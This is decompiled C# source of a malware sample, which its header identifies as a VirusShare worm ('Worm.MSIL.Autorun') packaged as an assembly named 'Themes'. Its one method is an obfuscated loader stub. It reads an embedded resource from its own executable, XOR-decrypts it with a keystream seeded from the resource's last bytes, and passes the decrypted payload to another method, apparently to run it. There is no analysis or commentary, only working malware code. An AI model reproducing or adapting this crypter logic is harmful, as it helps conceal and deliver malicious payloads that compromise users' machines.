// Decompiled with JetBrains decompiler
// Type: A.c7b523a4b8cc45572e28fe5b29e81e892
// Assembly: Themes, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F1CED465-DC2F-40DF-8008-E1A5BA91B6DC
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Worm.MSIL.Autorun.gj-eafdf0c256b415039327b1617f1f280eb22975e5d3328254127f60f9f6fa09f7.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace A
{
  [StandardModule]
  internal sealed class c7b523a4b8cc45572e28fe5b29e81e892
  {
    [DllImport("kernel32.dll", EntryPoint = "FindResource", SetLastError = true)]
    private static extern IntPtr c9bc1026a1f4019442bbb016c68298507(
      IntPtr c580a0321bea930c50c78481a6a268046,
      string c691ae362ee2b1bddb23f6fd98724de1e,
      string cf43567898ddb6ee017e905891f9d200a);

    [DllImport("kernel32", EntryPoint = "GetModuleHandleA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr c05047c55524adbc1708465aca91f5f4d(
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string c7ac65f6481f81867f8e1b936ee91eaf0);

    [DllImport("kernel32", EntryPoint = "SizeofResource", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int cd70c2942b7227fa333293e5c1dd75ba4(
      IntPtr c580a0321bea930c50c78481a6a268046,
      IntPtr c5b64990c8929eebb2da1ec2bc3e55aa1);

    [DllImport("kernel32", EntryPoint = "LoadResource", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr c1a851a47842680bd25c6069b288156ab(
      IntPtr c580a0321bea930c50c78481a6a268046,
      IntPtr c5b64990c8929eebb2da1ec2bc3e55aa1);

    public static void c0415ad8f3754c11a93ec67bb8b287f33()
    {
      string moduleName = Process.GetCurrentProcess().MainModule.ModuleName;
      IntPtr c580a0321bea930c50c78481a6a268046 = c7b523a4b8cc45572e28fe5b29e81e892.c05047c55524adbc1708465aca91f5f4d(ref moduleName);
      IntPtr c5b64990c8929eebb2da1ec2bc3e55aa1 = c7b523a4b8cc45572e28fe5b29e81e892.c9bc1026a1f4019442bbb016c68298507(c580a0321bea930c50c78481a6a268046, "0", "RT_RCDATA");
      IntPtr source = c7b523a4b8cc45572e28fe5b29e81e892.c1a851a47842680bd25c6069b288156ab(c580a0321bea930c50c78481a6a268046, c5b64990c8929eebb2da1ec2bc3e55aa1);
      int length = c7b523a4b8cc45572e28fe5b29e81e892.cd70c2942b7227fa333293e5c1dd75ba4(c580a0321bea930c50c78481a6a268046, c5b64990c8929eebb2da1ec2bc3e55aa1);
      byte[] numArray = new byte[checked (length - 1 + 1)];
      Marshal.Copy(source, numArray, 0, length);
      int int32 = BitConverter.ToInt32(numArray, checked (numArray.Length - 4));
      byte[] cbf51c12c49af2417bdb2ec6092f67575 = (byte[]) Utils.CopyArray((Array) numArray, (Array) new byte[checked (numArray.Length - 3 + 1)]);
      Random random = new Random(int32);
      byte[] buffer = new byte[checked (cbf51c12c49af2417bdb2ec6092f67575.Length - 1 + 1)];
      random.NextBytes(buffer);
      int num = checked (cbf51c12c49af2417bdb2ec6092f67575.Length - 1);
      int index = 0;
      while (index <= num)
      {
        cbf51c12c49af2417bdb2ec6092f67575[index] = (byte) ((int) cbf51c12c49af2417bdb2ec6092f67575[index] ^ (int) buffer[index]);
        checked { ++index; }
      }
      c6dd6e723b89a7627d43e5e0a295e728c.c6d62a1793d529be8f6d6100854e2c028(cbf51c12c49af2417bdb2ec6092f67575, Process.GetCurrentProcess().MainModule.FileName);
    }
  }
}
